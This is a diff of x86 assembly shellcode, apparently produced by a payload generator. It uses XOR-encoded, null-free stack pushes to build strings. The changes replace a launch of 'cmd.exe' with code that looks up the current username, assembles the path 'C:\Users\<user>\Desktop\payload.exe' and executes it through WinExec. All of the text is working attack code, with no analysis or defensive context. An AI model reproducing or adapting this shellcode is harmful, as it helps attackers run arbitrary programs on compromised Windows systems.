@@ -195,19 +195,32 @@ main:
 
 ; -- String Construction --
 
-; --- cmd: "cmd.exe" (push) ---
-; emit_push: "cmd.exe" (null-safe)
-; ESP = pointer to "cmd.exe\0" after pushes
+; --- path_prefix: "C:\Users\" (push) ---
+; emit_push: "C:\Users\" (null-safe)
+; ESP = pointer to "C:\Users\\0" after pushes
 
-    push 0x01647964
+    push 0x0101015d
     xor  dword ptr [esp], 0x01010101
-    push 0x2e646d63
-    mov  esi, esp        ; ESI = "cmd.exe"
+    push 0x73726573
+    push 0x555c3a43
+    mov  esi, esp        ; ESI = "C:\Users\"
+
+; --- path_suffix: "\Desktop\payload.exe" (push) ---
+; emit_push: "\Desktop\payload.exe" (null-safe)
+; ESP = pointer to "\Desktop\payload.exe\0" after pushes
+
+    xor  eax, eax
+    push eax
+    push 0x6578652e
+    push 0x64616f6c
+    push 0x7961705c
+    push 0x706f746b
+    push 0x7365445c
+    mov  esi, esp        ; ESI = "\Desktop\payload.exe"
 
 ; -- Structure Initialization --
 
-; --- CHAR_BUFFER_128 at [ebp-0x100] (0x80 bytes) ---
-; No initialization template available for CHAR_BUFFER_128.
+; (no structures)
 
 ; -- Payload --
 
@@ -235,45 +248,75 @@ wf_hang_1:
     jmp  wf_hang_1
 
 wf_entry:
-
-    ; LoadLibraryA(lpLibFileName)
-    lea  eax, [ebp-0x110]
-    push eax                      ; lpLibFileName
-    call dword ptr [ebp-0x28]
-    mov  [ebp-0x3c], eax
-    ; -> advapi_base
+    ; carve path_buf (128 bytes below ESP)
     mov  eax, 0x01010181
     xor  eax, 0x01010101
-    mov  [ebp-0x38], eax
-    ; -> username_len
-
-    ; GetUserNameA
-    lea  eax, [ebp-0x38]
-    push eax                      ; arg1
-    mov  ecx, 0xfefefe01
-    xor  ecx, 0x01010101
-    add  ecx, ebp
-    mov  eax, ecx
-    push eax                      ; arg0
-    call dword ptr [ebp-0x2c]
-    mov  [ebp-0x40], eax
-    ; -> getuser_ret
+    sub  esp, eax
+    mov  [ebp-0x40], esp
+    ; memcopy
+    lea  eax, [ebp-0x11c]
+    mov  esi, eax
     mov  eax, [ebp-0x40]
-    test eax, eax
-    jnz  wf_run_command
-    jmp  wf_fail
+    mov  edi, eax
+    mov  eax, 0x01010108
+    xor  eax, 0x01010101
+    mov  ecx, eax
+    cld
+    rep movsb
+    ; write_pos = ... add ...
+    mov  eax, [ebp-0x40]
+    mov  ecx, eax
+    mov  eax, 0x01010108
+    xor  eax, 0x01010101
+    add  ecx, eax
+    mov  [ebp-0x3c], ecx
+    ; username_len = ...
+    mov  eax, 0x01010141
+    xor  eax, 0x01010101
+    mov  [ebp-0x38], eax
 
-wf_run_command:
+    ; GetUserNameA(lpBuffer, pcbBuffer)
+    lea  eax, [ebp-0x38]
+    push eax                      ; pcbBuffer
+    mov  eax, [ebp-0x3c]
+    push eax                      ; lpBuffer
+    call dword ptr [ebp-0x2c]
+    mov  [ebp-0x44], eax
+    ; -> guna_ret
+    ; write_pos = ... add ...
+    mov  eax, [ebp-0x3c]
+    mov  ecx, eax
+    mov  eax, [ebp-0x38]
+    add  ecx, eax
+    mov  [ebp-0x3c], ecx
+    ; write_pos = ... sub ...
+    mov  eax, [ebp-0x3c]
+    mov  ecx, eax
+    mov  eax, 0x01010103
+    xor  eax, 0x01010102
+    sub  ecx, eax
+    mov  [ebp-0x3c], ecx
+    ; memcopy
+    lea  eax, [ebp-0x134]
+    mov  esi, eax
+    mov  eax, [ebp-0x3c]
+    mov  edi, eax
+    mov  eax, 0x01010114
+    xor  eax, 0x01010101
+    mov  ecx, eax
+    cld
+    rep movsb
 
     ; WinExec(lpCmdLine, uCmdShow)
-    xor  eax, eax
+    mov  eax, 0x01010103
+    xor  eax, 0x01010102
     push eax                      ; uCmdShow
-    lea  eax, [ebp-0x118]
+    mov  eax, [ebp-0x40]
     push eax                      ; lpCmdLine
     call dword ptr [ebp-0x30]
-    mov  [ebp-0x44], eax
+    mov  [ebp-0x48], eax
     ; -> exec_ret
-    mov  eax, [ebp-0x44]
+    mov  eax, [ebp-0x48]
     test eax, eax
     jnz  wf_success
     jmp  wf_fail
